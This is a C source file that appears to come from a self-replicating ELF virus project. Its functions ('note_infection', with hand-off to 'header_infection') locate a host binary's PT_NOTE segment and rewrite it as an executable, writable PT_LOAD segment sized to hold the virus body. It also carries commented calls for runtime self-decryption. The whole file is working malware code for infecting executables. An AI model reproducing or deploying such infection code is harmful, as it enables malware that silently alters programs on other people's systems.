#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struct s_host *host, const size_t index)
{
	Elf64_Phdr *segment;

	segment = (Elf64_Phdr *)((void *)host->header + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));

	if ((void *)segment >= (void *)host->header + host->filesize)
		segment = NULL;

	return segment;
}

__attribute__((always_inline)) static inline bool is_data_segment(const Elf64_Phdr *segment)
{
	if (segment->p_type != PT_LOAD)
		return false;

	return segment->p_flags == (PF_W | PF_R);
}

__attribute__((always_inline)) static inline bool is_note_segment(const Elf64_Phdr *segment)
{
	return segment->p_type == PT_NOTE;
}

__attribute__((always_inline)) static inline void update_note_segment(struct s_note *note) 
{
	const size_t base = note->data->p_vaddr + note->data->p_memsz;
	const size_t add_padding = base % note->data->p_align;

	note->self->p_vaddr = base + (note->data->p_align - add_padding);
	note->self->p_paddr = note->self->p_vaddr;
	note->self->p_offset = base - add_padding;

	note->self->p_filesz = (void *)__exit - (void *)__entry;
	note->self->p_memsz = (void *)__exit - (void *)__entry;

	note->self->p_type = PT_LOAD;
	note->self->p_flags = (PF_X | PF_W | PF_R);
	note->self->p_align = note->data->p_align;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

#if DEBUG
	MID_TRACER("note_infection:\t\t");
#endif

	if (context == FAILURE)
		goto label;
	
	struct s_note note = {0};
	Elf64_Phdr *segment = NULL;

	for (register Elf64_Half index = 0; index < host->header->e_phnum; index++)
	{
		if ((segment = get_segment(host, index)) == NULL)
		{
			context = FAILURE;
			goto label;
		}

		if (is_data_segment(segment) == true)
			note.data = segment;
		if (is_note_segment(segment) == true)
			note.self = segment;
	}
	
	if (segment == NULL || note.self == NULL)
	{
		context = FAILURE;
		goto label;
	}

	update_note_segment(&note);
	host->note = &note;

label:
//	update_keychain_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	header_infection(host, keychain, context);
}
